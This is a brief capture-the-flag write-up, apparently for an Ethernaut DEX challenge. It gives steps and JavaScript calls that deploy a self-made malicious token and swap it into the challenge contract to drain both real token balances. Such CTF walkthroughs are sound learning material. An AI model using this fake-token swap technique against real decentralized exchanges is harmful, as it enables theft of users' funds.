## This challenge requires us to deploy a contract and call some functions on the ethernaut page

1. Deploy MalToken contract
2. Using the deployed contract, approve the ethernaut contract as a spender for some large amount (>= 300)
3. Since we can't call the add_liquidity function, we'll just transfer 100 MalToken to the contract. So the contract should now have a balance of 100 for MalToken
4. We can then call these functions in the ethernaut page:
```
const token1 = await contract.token1() 
const token2 = await contract.token2() 
malToken = <put in your deployed token address>

// clear out token1 balance
await contract.swap(malToken, token1, 100)

// the contract now has 200 malToken and 100 token2. So in order to clear out token2, we'd need to swap 200 malToken for token2
await contract.swap(malToken, token2, 200)
```

